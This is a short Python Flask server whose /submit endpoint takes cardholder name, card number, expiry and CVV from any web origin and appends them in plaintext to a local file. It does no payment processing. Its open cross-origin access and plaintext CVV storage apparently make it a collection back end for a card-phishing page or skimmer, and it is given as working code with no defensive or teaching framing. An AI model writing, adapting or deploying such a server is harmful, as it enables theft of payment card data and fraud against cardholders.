from flask import Flask, request, jsonify
from flask_cors import CORS
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

data_file = "card_data.txt"

@app.route('/submit', methods=['POST'])
def submit_data():
    data = request.get_json()
    cardname = data.get('cardname')
    cardnumber = data.get('cardnumber')
    expiry = data.get('expiry')
    cvv = data.get('cvv')
    
    if cardname and cardnumber and expiry and cvv:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(data_file, 'a') as file:
            file.write(f"[{timestamp}]\n")
            file.write(f"Name: {cardname}\n")
            file.write(f"Card: {cardnumber}\n")
            file.write(f"Expiry: {expiry}\n")
            file.write(f"CVV: {cvv}\n")
            file.write("-" * 30 + "\n")
        return jsonify({"message": "Success"}), 200
    else:
        return jsonify({"message": "Invalid data"}), 400

if __name__ == '__main__':
    if not os.path.exists(data_file):
        with open(data_file, 'w') as f:
            pass
    app.run(debug=True, port=8080)

